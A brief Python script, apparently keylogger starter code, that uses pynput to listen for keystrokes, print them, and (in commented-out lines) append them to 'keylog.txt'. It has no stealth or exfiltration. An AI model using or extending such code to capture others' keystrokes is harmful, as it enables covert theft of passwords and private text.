import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        # Convert key to a printable character
        key_str = key.char
        print(f"Key pressed: {key_str}")

        # Write to file (you'd need to handle file opening/closing)
        # with open("keylog.txt", "a") as file:
        #     file.write(key_str)

    except AttributeError:
        # Handle special keys
        if key == Key.space:
            print("Space pressed")
        elif key == Key.enter:
            print("Enter pressed")
        else:
            print(f"Special key: {key}")

def on_release(key):
    if key == Key.esc:
        # Stop listener on Esc key press
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
